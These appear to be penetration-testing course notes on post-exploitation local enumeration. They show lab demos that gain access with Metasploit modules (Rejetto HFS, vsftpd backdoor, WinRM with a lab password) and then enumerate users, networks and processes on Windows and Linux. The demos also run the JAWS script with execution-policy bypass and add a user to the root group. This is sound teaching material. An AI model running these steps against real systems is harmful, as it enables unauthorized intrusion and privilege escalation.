# Introduction

## Post-Exploitation

### Introduction to Post-Exploitation

#### Post-Exploitation

- Post-exploitation is the final phase of the pentest process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
- In other words, post-exploitation involves what you do or have to do once you gain an initial foothold on the target system.
- Post-exploitation will differ based on the target operating system as well as the target infrastructure.
- The post-exploitation techniques and tools that you canuse will depend on what kind of access you have on the system you have compromised as well as how stealthy you have to be.
- This ultimately means that you will need to utilize different techniques and tools based on the target operating system and its configuration.
- The post-exploitation techniques you can run against the target will need to abide by the rules of engagement agreed upon with the client you are perform the pentest for.

**Note:** When running post-exploitation techniques, you need to be sure that you have the necessary permissions and rights to modify services, system configurations, perform privilege escalation, delete logs etc.

![grafik](https://github.com/user-attachments/assets/37bcb4e2-30fd-4654-a6be-26d736921485)


This diagram outlines the various phases of the pentesting lifecycle and highlights the post exploitation phase and the techniques that fall under the post-exploitation phase
  
### Post-Exploitation Methodology

#### Post-Exploitation Methodology

In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements.
This structured, methodological approach ensured that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

#### Post-Exploitation Methodology

![grafik](https://github.com/user-attachments/assets/f258672d-32f0-4398-9055-1254d16e44e7)

#### Local Enumeration

![grafik](https://github.com/user-attachments/assets/6b551663-dd57-4e06-956b-4e819717dc27)

#### Transferring Files

![grafik](https://github.com/user-attachments/assets/9cb527ee-3a8b-4efc-95ed-844a626bf567)

#### Upgrading Shells

![grafik](https://github.com/user-attachments/assets/c74a105a-480c-4bbe-9cd6-edb18a8d777c)

#### Privilege Escalation

![grafik](https://github.com/user-attachments/assets/0e3242b3-3d4f-4b80-8cff-e2bdcfe783bb)

#### Persistence 

![grafik](https://github.com/user-attachments/assets/64a60b50-4d17-44f7-8ac2-bacf95f67253)

#### Dumping & Cracking Hashes

![grafik](https://github.com/user-attachments/assets/38ea8a98-afa0-434a-91ee-b2f3a142d716)

#### Pivoting

![grafik](https://github.com/user-attachments/assets/43063dc6-7abd-40fa-b1e8-7cf56a6164a6)

#### Clearing Your Tracks 

![grafik](https://github.com/user-attachments/assets/1a380143-5adb-4f68-a339-e845b3383064)

# Windows Enumeration

## Windows Local Enumeration

### Enumerating System Information

#### Enumerating System Information

- After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - OS Name (Windows 7,8 etc)
  - OS Build & Service Pack (Windows 7 SP1 7600)
  - OS Architecture (x64&x86)
  - Installed updates/Hotfixes

### Demo: Enumerating System Information


#### Step 1: Check Connectivity to the Target

To verify if the target machine is reachable, use the **ping** command:

```bash
ping -c 4 demo.ine.local
```

- If the target responds, it indicates that the system is reachable.

#### Step 2: Port Scanning with Nmap

Perform a service version detection scan to identify vulnerable services on the target system using **Nmap**:

```bash
nmap -sV demo.ine.local
```

- The scan should reveal services running on open ports. In this case, port **80** is running **Rejetto HTTP File Server 2.3**.

#### Step 3: Searching for Exploits Using Searchsploit

With the information from the Nmap scan, search for known vulnerabilities affecting **Rejetto HTTP File Server 2.3** using **Searchsploit**:

```bash
searchsploit rejetto
```

- The **Searchsploit** output reveals an available **Metasploit Framework exploit module** that targets this version of **Rejetto**.

#### Step 4: Gaining Access with Metasploit

To exploit the vulnerability, start the **Metasploit Framework** and use the **Rejetto HFS exploit module**:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Load the **Rejetto HFS exploit module**:

    ```bash
    use exploit/windows/http/rejetto_hfs_exec
    ```

3. Set the target address:

    ```bash
    set RHOSTS demo.ine.local
    ```

4. Execute the exploit:

    ```bash
    exploit
    ```

If successful, this will open a **Meterpreter session** on the target system.

#### Step 5: Enumerating System Information

Once you gain access to the system, itâ€™s important to gather as much information as possible to understand the system's environment and any potential vulnerabilities.

#### Step 5.1: System Information with Meterpreter

Run the **sysinfo** command to get basic system information:

```bash
sysinfo
```

- Output: Shows the **operating system**, **hostname**, **architecture**, and **domain** of the target system. In this case, the system is running **Windows Server 2012 R2**.

#### Step 5.2: Spawn a Native Shell and Get Hostname

To switch to a native shell session on the target, run:

```bash
shell
```

Once in the shell, you can run native Windows commands, such as getting the hostname:

```bash
hostname
```

#### Step 5.3: Detailed System Information

For more detailed system information, such as hardware details and a list of installed Windows updates, use the **systeminfo** command:

```bash
systeminfo
```

- This provides critical details, including **Windows version**, **OS build number**, **hardware configuration**, and **installed HotFixes**.

You can also retrieve a detailed list of installed updates, including the **HotFix IDs** and **installation dates**, by running the following **WMIC** command:

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Output: Displays when each update was installed and its **HotFix ID**, which helps identify potential vulnerabilities or missing patches.

#### Why Is This Information Important?

- **Installed HotFixes** and **system details** provide insight into whether the system is missing critical updates or patches that could allow for privilege escalation or lateral movement.
- Knowing the **operating system** version, build number, and installed patches helps you determine if there are any known vulnerabilities that can be exploited to further compromise the system.

---

#### Conclusion

In this demo, we:
1. Checked connectivity to the target system.
2. Used **Nmap** to identify services running on the target.
3. Found an exploit for **Rejetto HTTP File Server 2.3** using **Searchsploit**.
4. Exploited the service using **Metasploit** to gain a **Meterpreter session** on the target.
5. Enumerated system information, including the **Windows version**, **installed updates**, and other details, to identify potential vulnerabilities.

This process is critical in any penetration test as it helps gather useful information that can be used to further escalate privileges or move laterally across the network.

### Enumerating Users & Groups

- After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
- What are we looking for?
  - Current user & privileges
  - Additional user information
  - Other users on the system
  - Groups
  - Members of the built-in administrator group

### Demo: Enumerating Users & Groups

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Check User ID and Privileges

Once we have a **Meterpreter session**, check the current user and privileges:

```bash
getuid
getprivs
```

#### Step 3: Enumerating Logged-On Users Using Metasploit

Background the session:

```bash
background
```

Search for the **enum_logged_on_users** module:

```bash
search logged_on
```

Use the module:

```bash
use post/windows/gather/enum_logged_on_users
```

Set the **Meterpreter session ID**:

```bash
set session 1
```

Run the module:

```bash
run
```

#### Step 4: Return to the Meterpreter Session

Return to the **Meterpreter session** to continue manual enumeration:

```bash
sessions 1
```

### ### Performing User & Group Enumeration Manually

Switch to a **native shell** to perform manual enumeration:

```bash
shell
```

Run the following commands to enumerate users, groups, and privileges:

- **Check privileges** of the current user:

    ```bash
    whoami /priv
    ```

- **Query logged-on users**:

    ```bash
    query user
    ```

- **List all local users**:

    ```bash
    net users
    ```

- **Check details of the Administrator account**:

    ```bash
    net user administrator
    ```

- **List local groups**:

    ```bash
    net localgroup
    ```

- **List members of the Administrators group**:

    ```bash
    net localgroup administrators
    ```

### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Ran **Metasploit's post-exploitation module** to enumerate logged-on users.
3. Performed manual **user and group enumeration** using native **Windows commands**.

This process helps in identifying user accounts and privilege levels, which can be useful for further exploitation or privilege escalation.

#### Enumerating Network Information

- What are we looking for?
  - Current IP address & network adapter
  - Internal networks
  - TCP/UDP services running and their respective ports
  - Other hosts on the network
  - Routing table
  - Windows Firewall state

### Demo: Enumerating Network Information

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Open a Shell Session

Switch to a **native shell** to begin enumerating network information:

```bash
shell
```

#### Step 3: Enumerating Network Configuration

To gather network information such as the **IP address** and **adapter details**, use the following commands:

- Display **IP configuration**:

    ```bash
    ipconfig
    ```

- Display detailed **IP configuration and adapter info**:

    ```bash
    ipconfig /all
    ```

#### Step 4: Displaying the Routing Table

To view the system's **routing table**:

```bash
route print
```

#### Step 5: Viewing the ARP Table

The **ARP table** lists all devices on the network that the system has communicated with:

```bash
arp -a
```

#### Step 6: Listing Open Ports and Services

Use **netstat** to list open ports, active connections, and services running on the system:

```bash
netstat -ano
```

#### Step 7: Working with the Windows Firewall

Check the state of the **Windows Firewall** using **netsh**:

- View basic firewall state:

    ```bash
    netsh firewall show state
    ```

- For newer Windows versions, use the following **netsh** commands for **Advanced Firewall**:

    ```bash
    netsh advfirewall firewall state
    ```

    ```bash
    netsh advfirewall
    ```

    ```bash
    netsh advfirewall firewall help
    ```

- Dump current firewall rules to review configuration:

    ```bash
    netsh advfirewall firewall dump
    ```

- Show the state of all firewall profiles (domain, private, public):

    ```bash
    netsh advfirewall show allprofiles
    ```

- **Note**: **netsh advfirewall** allows managing firewall settings, including creating listeners or configuring ports for communication.

#### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Used native Windows commands to gather detailed **network information**:
   - Checked the IP configuration, routing table, and ARP table.
   - Listed open ports and services.
   - Investigated the **Windows Firewall** configuration.

This information can be useful for identifying potential attack vectors, open ports for further exploitation, and understanding the network topology of the target environment.

### Enumerating Processes & Services

- After gaining initial access to a target system, it is always important to learn more about the system like, what processes, sevices and scheduled tasks are currently running.
- What are we looking for?
  - Running processes & services
- A process is an instance of a running executable (.exe) or program.
- A service is a process which runs in the background and does not interact with the desktop.

### Demo: Enumerating Processes & Services

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Enumerating Running Processes

To list all currently running processes, use the following command in the **Meterpreter session**:

```bash
ps
```

#### Step 3: Migrating to a Stable Process

Itâ€™s often beneficial to migrate the **Meterpreter session** to a stable process such as **explorer.exe**. First, identify the **process ID (PID)** of `explorer.exe`:

```bash
pgrep explorer.exe
```

Once the process is found, migrate to it by specifying the PID:

```bash
migrate 2176
```

Migration will allow us to maintain a more stable connection. After migration, check the system architecture:

```bash
sysinfo
```

#### Step 4: Checking if a Specific Process is Running

To check if a specific process, such as **hfs.exe**, is running:

```bash
pgrep hfs.exe
```

#### Step 5: Enumerating Processes & Services via Shell

Switch to a **native shell** to list running processes and services:

```bash
shell
```

- **List all running services**:

    ```bash
    net start
    ```

- **List services in brief using **WMIC** (Windows Management Instrumentation Command)**:

    ```bash
    wmic service list brief
    ```

- **List processes with their associated services**:

    ```bash
    tasklist /SVC
    ```

#### Step 6: Enumerating Scheduled Tasks

Misconfigured **scheduled tasks** can sometimes be used to elevate privileges. Use the following commands to list them:

- **Query scheduled tasks** in a simple list format:

    ```bash
    schtasks /query /fo LIST
    ```

- **Query detailed information** on scheduled tasks:

    ```bash
    schtasks /query /fo LIST /v
    ```

This will display all scheduled tasks and detailed information, which could be useful for identifying potential misconfigurations or escalation vectors.

### Conclusion

In this demo, we:
1. Used **Meterpreter** to enumerate running processes on the target system.
2. Migrated to a stable process, **explorer.exe**, for a more reliable connection.
3. Switched to a **native shell** to list running services and processes using **net start**, **WMIC**, and **tasklist**.
4. Enumerated **scheduled tasks**, which could be potential targets for privilege escalation.

Understanding the processes and services running on a target system is critical for identifying misconfigurations, potential targets for further exploitation, or establishing persistence on the system.

### Automating Windows Local Enumeration

- In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
- While local enumeration techniques/commands are important to know, as a pentester, we will need to be time efficient. As a result, we will need to learn how to utilize various automated enumeration scripts.
- In addition to automating the process of enumeration information like system information, users & groups etc, these automated enumeration scripts will also provide us with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords etc.

#### Windows Local Enum Scripts

- JAWS - just another Windows (enum) Scirpt - Jaws is a powershell script designed to help pentesters quickly identify potential privilege escalation vectors on Windows systems. It is written using Powrshell 2.0 so it should run on every Windows version since Win 7.
- GitHub Repo: https://github.com/411Hall/JAWS


### Demo: Automating Windows Local Enumeration

#### Step 1: Gaining Initial Access to the Target

First, perform an Nmap scan to identify any services running on the target system, such as **WinRM** (Windows Remote Management):

```bash
nmap -sV -p 5985 demo.ine.local
```

If **WinRM** is available, use **Metasploit** to gain access:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Use the **WinRM script execution exploit**:

    ```bash
    use exploit/windows/winrm/winrm_script_exec
    ```

3. Configure the target address and credentials:

    ```bash
    set rhosts demo.ine.local
    set USERNAME administrator
    set PASSWORD tinkerbell
    set FORCE_VBS true
    ```

4. Run the exploit:

    ```bash
    run
    ```

5. Once you have access, check basic system information:

    ```bash
    sysinfo
    getuid
    ```

#### Step 2: Automated Enumeration with Metasploit

Once you have a **Meterpreter session**, you can use several **Metasploit post-exploitation modules** to automate local enumeration on the target.

1. **Show mounted drives**:

    ```bash
    show_mount
    ```

2. Background the session:

    ```bash
    background
    ```

3. Useful MSF enumeration modules:

    - **Enumerate user privileges**:

        ```bash
        use post/windows/gather/win_privs
        ```

    - **Enumerate logged-on users**:

        ```bash
        use post/windows/gather/enum_logged_on_users
        ```

    - **Check if the system is running in a virtual machine**:

        ```bash
        use post/windows/gather/checkvm
        ```

    - **Enumerate installed applications** (useful for identifying potentially vulnerable software):

        ```bash
        use post/windows/gather/enum_application
        ```

    - **Enumerate computers connected to the same network**:

        ```bash
        use post/windows/gather/enum_computers
        ```

    - **Enumerate installed patches**:

        ```bash
        use post/windows/gather/enum_patches
        ```

    - **Enumerate shared drives**:

        ```bash
        use post/windows/gather/enum_shares
        ```

#### Step 3: Using JAWS (Just Another Windows (Enum) Script)

**JAWS** is a PowerShell script used for automating the local enumeration of Windows machines. To use it:

1. Copy the content of the **JAWS** script to your lab environment (under **root/Desktop/jaws-enum.ps1**).

2. Return to your **Meterpreter session** and create a temporary directory on the target machine:

    ```bash
    sessions 1
    cd C:\
    mkdir Temp
    cd Temp
    ```

3. Upload the **JAWS** script to the target system:

    ```bash
    upload /root/Desktop/jaws-enum.ps1
    ```

4. Open a shell to execute the script:

    ```bash
    shell
    ```

5. List the contents of the current directory to verify the script is uploaded:

    ```bash
    dir
    ```

6. Execute the **JAWS** script using PowerShell and output the results to a file:

    ```bash
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```

7. Exit the shell and return to the **Meterpreter session** using **CTRL + C**.

8. Download the results file to your local machine for further analysis:

    ```bash
    download jaws-enum.txt
    ```

- The output contains a lot of useful information for further privilege escalation or enumeration.

#### Conclusion

In this demo, we:
1. Gained access to the target system using **WinRM** and **Metasploit**.
2. Automated local enumeration with **Metasploit**'s post-exploitation modules.
3. Used the **JAWS** script for deeper enumeration of the target, obtaining valuable information such as running processes, installed patches, and potential privilege escalation vectors.

Automating local enumeration saves time and ensures that no critical system information is missed, especially when preparing for further exploitation or privilege escalation.

# Linux Enumeration

## Linux Local Enumeration

### Enumerating System Information

- After gaining initial access to a target systen, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - Distribution & distribution release version
  - Kernel version & architecture
  - CPU information
  - Disk information & mounted drives
  - Installed packages/software

### Demo: Enumerating System Information

#### Step 1: Gaining Initial Foothold on the Target

First, we perform a service version detection scan using **Nmap** to identify the services running on the target system:

```bash
nmap -sV demo.ine.local
```

Once we identify **vsftpd** as a vulnerable service, we can search for related exploits using **Searchsploit**:

```bash
searchsploit vsftpd
```

#### Step 2: Exploiting the Target with Metasploit

Start **Metasploit**:

```bash
msfconsole
```

Search for the **vsftpd** exploit module:

```bash
search vsftpd
```

Set the target address:

```bash
setg rhosts demo.ine.local
```

Use the **vsftpd backdoor** exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

List the contents of the current directory:

```bash
ls
```

Spawn a **bash shell**:

```bash
/bin/bash -i
```

After interacting with the shell, send the session to the background:

```bash
CTRL + Z
```

List all active sessions:

```bash
sessions
```

Upgrade the current session to a **Meterpreter session**:

```bash
sessions -u 1
```

Once upgraded, list all sessions:

```bash
sessions
```

Switch to session 2:

```bash
sessions 2
```

#### Step 3: Performing System Enumeration

Switch to a **native shell** to begin enumerating system information:

```bash
shell
```

Spawn an **interactive bash shell**:

```bash
/bin/bash -i
```

Change to the root directory:

```bash
cd /root
```

- **Display the hostname** of the system:

    ```bash
    hostname
    ```

- **Show information about the operating system**:

    ```bash
    cat /etc/issue
    cat /etc/*release
    ```

- **Display detailed information about the system kernel**:

    ```bash
    uname -a
    uname -r
    ```

- **Display environment variables**:

    ```bash
    env
    ```

- **List detailed information about the CPU architecture**:

    ```bash
    lscpu
    ```

- **Display disk usage**:

    ```bash
    df -h
    ```

- **Display disk usage for ext4 filesystems**:

    ```bash
    df -ht ext4
    ```

- **List all block devices and grep for storage devices**:

    ```bash
    lsblk | grep sd
    ```

- **List all installed packages** on the target system:

    ```bash
    dpkg -l
    ```

### Conclusion

In this demo, we:
1. Gained initial access to the target by exploiting **vsftpd** using Metasploit.
2. Upgraded the shell session to a **Meterpreter session** for easier interaction.
3. Enumerated key system information using basic **Linux commands**:
   - Gathered system information such as the hostname, OS version, kernel details, and CPU architecture.
   - Collected information about mounted filesystems, storage devices, and installed packages.

This enumeration provides essential details for further exploitation, privilege escalation, or maintaining persistence on the target system.

### Enumerating User & Groups on a Linux Target System

- After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
- What are we looking for?
  - Current user & privileges
  - Other users on the system
  - Groups
 
#### Step 1: Gaining Initial Foothold

To begin enumerating users and groups, we first need to gain access to the target system. Use the same method as before, such as exploiting **vsftpd** or any other vulnerable service.

Once access is obtained, check the user identity:

```bash
meterpreter > getuid
```

Switch to a **native shell**:

```bash
meterpreter > shell
/bin/bash -i
```

Change to the **root directory**:

```bash
cd /root
```

#### Step 2: Enumerating Users

Check the current user:

```bash
whoami
```

Display the groups the current user belongs to:

```bash
groups
```

To check groups for a specific user (e.g., **bob**):

```bash
groups bob
```

List all users on the system by reading the **passwd** file:

```bash
cat /etc/passwd
```

Note that **service accounts** typically have `sbin/nologin`, meaning they are not used for interactive logins. To filter out those accounts:

```bash
cat /etc/passwd | grep -v /nologin
```

The structure of each line in the **passwd** file is as follows:

- `username, userid, groupid, home directory, shell`

List the contents of the **/home directory** to see the user home directories:

```bash
ls -al /home
```

#### Step 3: Managing User Groups

To modify user group memberships, we can add a user (e.g., **bob**) to the **root group** (admin privileges):

```bash
usermod -aG root bob
```

Verify the user's group memberships again:

```bash
groups bob
```

#### Step 4: Enumerating Logins

Check currently logged-in users:

```bash
who
```

Check the last users who logged into the system:

```bash
last
```

View the last login time for each user:

```bash
lastlog
```

#### Conclusion

In this demo, we:
1. Gained initial access to the target system and switched to a **native shell**.
2. Enumerated users and groups by checking the **passwd** file, **groups**, and home directories.
3. Managed group memberships by adding a user to the **root group**.
4. Checked login history with **who**, **last**, and **lastlog**.

This enumeration is essential for understanding the users and access controls on the target system, which can help in identifying potential privilege escalation opportunities.

### Enumerating Network Information

- What are we looking for?
  - Current IP address & network adapter
  - Internal networks
  - TCP/UDP services running and their respective ports
  - Other hosts on the network

### Demo: Enumerating Network Information

#### Step 1: Gaining Initial Foothold

To begin enumerating network information, first gain access to the target system using a previously exploited vulnerability such as **vsftpd** or another service. After gaining a foothold, upgrade your command shell session to a **Meterpreter session**.

#### Step 2: Enumerating Network Information with Meterpreter

Once you have a **Meterpreter session**, begin by gathering network configuration details:

- **Display network interface information**:

    ```bash
    meterpreter > ifconfig
    ```

- **Show network connections, listening ports, and routing tables**:

    ```bash
    meterpreter > netstat
    ```

#### Step 3: Enumerating Network Information with a Shell

Switch to a **native shell** for more detailed network information:

```bash
meterpreter > shell
/bin/bash -i
```

Use the following commands to gather more specific network information:

- **List all network interfaces**:

    ```bash
    ip a s
    ```

- **Show network configurations**:

    ```bash
    cat /etc/networks
    ```

- **Display the hostname of the system**:

    ```bash
    cat /etc/hostname
    ```

- **Show the local DNS entries**:

    ```bash
    cat /etc/hosts
    ```

- **Show the DNS resolver configuration**:

    ```bash
    cat /etc/resolv.conf
    ```

#### Step 4: Displaying ARP Table

To enumerate the **ARP table** (Address Resolution Protocol), use the following commands:

- **Using the shell**:

    ```bash
    arp -a
    ```

- **Using Meterpreter's built-in ARP command**:

    ```bash
    meterpreter > arp
    ```

To return from the shell to the **Meterpreter session**, use the **CTRL + Z** key combination.

#### Conclusion

In this demo, we:
1. Gained access to the target system using a vulnerable service.
2. Enumerated network information using **Meterpreter** and basic shell commands.
3. Gathered critical information such as network interfaces, ARP tables, DNS configurations, and more.

Network enumeration is crucial for understanding the target's network environment, identifying potential attack paths, and planning further exploitation or lateral movement within the network.
